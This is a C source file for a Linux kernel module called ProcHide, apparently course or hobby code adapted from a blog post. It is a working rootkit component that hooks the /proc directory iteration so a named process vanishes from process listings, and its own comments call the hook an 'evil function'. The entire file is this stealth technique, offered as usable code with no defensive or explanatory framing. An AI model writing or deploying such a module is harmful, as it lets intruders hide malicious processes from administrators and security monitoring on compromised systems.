// src https://yassine.tioual.com/index.php/2017/01/10/hiding-processes-for-fun-and-profit/

#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/namei.h>
#include <linux/proc_fs.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("CSEN1001");
MODULE_VERSION("1.0");

static int __init phide_init(void);
static void __exit phide_exit(void);

static char *proc_to_hide = "";
static struct file_operations proc_fops;
static struct file_operations *backup_proc_fops;
static struct inode *proc_inode;
static struct path p;

struct dir_context *backup_ctx;

// #################################
// Helpers                         #
// #################################

static int rk_filldir_t(struct dir_context *ctx, const char *proc_name, int len,
                        loff_t off, u64 ino, unsigned int d_type)
{
    if (strncmp(proc_name, proc_to_hide, strlen(proc_to_hide)) == 0)
        return 0;

    return backup_ctx->actor(backup_ctx, proc_name, len, off, ino, d_type);
}

struct dir_context rk_ctx = {
    .actor = rk_filldir_t,
};

int rk_iterate_shared(struct file *file, struct dir_context *ctx)
{
    int result = 0;
    rk_ctx.pos = ctx->pos;
    backup_ctx = ctx;
    result = backup_proc_fops->iterate_shared(file, &rk_ctx);
    ctx->pos = rk_ctx.pos;

    return result;
}

// #################################
// Main Functions                  #
// #################################

static int __init phide_init(void)
{
    if (proc_to_hide[0] == '\0')                    // check if proc is set
    {
        printk(KERN_INFO "ProcHide: LKM can not be loaded, \'proc_to_hid\' is not set!\n");
        phide_exit();
        return ESRCH;                               // error ESRCH: no such process
    }

    printk(KERN_INFO "ProcHide: LKM succefully loaded!\n");

    if (kern_path("/proc", 0, &p))                  // fetch the procfs entry
        return ENOENT;                              // error ENOENT: no such file or directory

    proc_inode = p.dentry->d_inode;                 // get the inode

    proc_fops = *proc_inode->i_fop;                 // get a copy of file_operations from inode
    backup_proc_fops = proc_inode->i_fop;           // backup the file_operations
    proc_fops.iterate_shared = rk_iterate_shared;   // modify the copy with out evil function
    proc_inode->i_fop = &proc_fops;                 // overwrite the active file_operations

    return 0;
}

static void __exit phide_exit(void)
{
    if (kern_path("/proc", 0, &p))
        return;

    // get inode and restore file_operations
    proc_inode = p.dentry->d_inode;
    proc_inode->i_fop = backup_proc_fops;

    printk(KERN_INFO "ProcHide: LKM succefully unloaded!\n");
}

module_init(phide_init);
module_exit(phide_exit);
